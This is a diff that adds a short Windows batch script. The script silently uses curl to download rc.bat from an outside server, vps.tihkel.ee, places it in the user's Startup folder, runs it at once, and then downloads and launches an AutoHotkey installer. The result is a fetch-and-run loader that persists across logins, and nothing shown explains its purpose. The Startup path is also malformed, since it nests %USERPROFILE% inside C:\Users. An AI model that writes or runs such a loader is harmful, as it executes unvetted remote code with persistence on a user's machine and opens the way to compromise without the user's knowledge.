@@ -1,0 +1,5 @@
+@echo off
+curl -s vps.tihkel.ee/win/rc.bat -o "C:\Users\%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\win\rc.bat"
+"C:\Users\%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\win\rc.bat"
+
+if not exist "%USERPROFILE%\AppData\Local\Programs\AutoHotkey" curl -o %USERPROFILE%\Downloads\ahk-v2.exe https://www.autohotkey.com/download/ahk-v2.exe && start %USERPROFILE%\Downloads\ahk-v2.exe
